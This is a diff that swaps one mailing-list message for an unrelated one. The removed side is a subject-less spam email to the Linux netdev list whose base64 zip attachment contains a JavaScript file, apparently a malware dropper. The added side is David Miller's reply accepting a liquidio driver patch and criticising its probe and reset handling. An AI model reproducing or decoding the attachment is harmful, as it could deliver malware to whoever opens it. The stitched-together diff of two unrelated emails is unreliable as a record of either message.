@@ -1,100 +1,54 @@
-From: <stef.ryckmans@kortenberg.be>
-Subject: (unknown)
-Date: Wed, 17 May 2017 18:42:06 -0000
-Message-ID: <149504652675.6150.14468193084121821332@surnet.ru>
+From: David Miller <davem@davemloft.net>
+Subject: Re: [PATCH net-next] liquidio: fix insmod failure when multiple
+ NICs are plugged in
+Date: Wed, 17 May 2017 14:50:29 -0400 (EDT)
+Message-ID: <20170517.145029.507361457936948797.davem@davemloft.net>
+References: <20170516181450.GA1014@felix-thinkpad.cavium.com>
 Mime-Version: 1.0
-Content-Type: application/zip; name="08149217870.zip"
-Content-Transfer-Encoding: base64
-To: <netdev@vger.kernel.org>
+Content-Type: Text/Plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Cc: netdev@vger.kernel.org, raghu.vatsavayi@cavium.com,
+        derek.chickles@cavium.com, satananda.burla@cavium.com,
+        ricardo.farrington@cavium.com
+To: felix.manlunas@cavium.com
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from ip-31-162-213-72.dsl.surnet.ru ([31.162.213.72]:35955 "HELO
-        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
-        id S1753789AbdEQSmL (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Wed, 17 May 2017 14:42:11 -0400
-Content-Disposition: attachment
-Subject: 
+Received: from shards.monkeyblade.net ([184.105.139.130]:35478 "EHLO
+        shards.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1750838AbdEQSud (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Wed, 17 May 2017 14:50:33 -0400
+In-Reply-To: <20170516181450.GA1014@felix-thinkpad.cavium.com>
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-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
-6fWAds/SAVBLBQYAAAAAAQABAFoAAAC2EQAAAAA=
+From: Felix Manlunas <felix.manlunas@cavium.com>
+Date: Tue, 16 May 2017 11:14:50 -0700
+
+> From: Rick Farrington <ricardo.farrington@cavium.com>
+> 
+> When multiple liquidio NICs are plugged in, the first insmod of the PF
+> driver succeeds.  But after an rmmod, a subsequent insmod fails.  Reason is
+> during rmmod, the PF driver resets the Octeon of only one of the NICs; it
+> neglects to reset the Octeons of the other NICs.
+> 
+> Fix the insmod failure by adding the missing Octeon resets at rmmod.  Keep
+> a per-NIC refcount that indicates the number of active PFs in a given NIC.
+> When the refcount goes to zero, then reset the Octeon of that NIC.
+> 
+> Signed-off-by: Rick Farrington <ricardo.farrington@cavium.com>
+> Signed-off-by: Felix Manlunas <felix.manlunas@cavium.com>
+
+I'm applying this but I'm really not happy with how this driver handles
+probing.
+
+There is no reason to have arbitrary limits to the number of adapters,
+everything should be dynamic and allow arbitrary numbers of instances
+even if that is not physically possible with current hardware.
+
+Also, the driver should be able to load even if something isn't reset
+properly.  A boot loader or some other entity could have programmed
+the device or something like a kdump kernel could leave it in an
+indeterminate state.
+
+So you must be able to probe the device even if it has not been soft
+reset properly.  In fact, the soft reset probably should happen during
+probe not during shutdown.
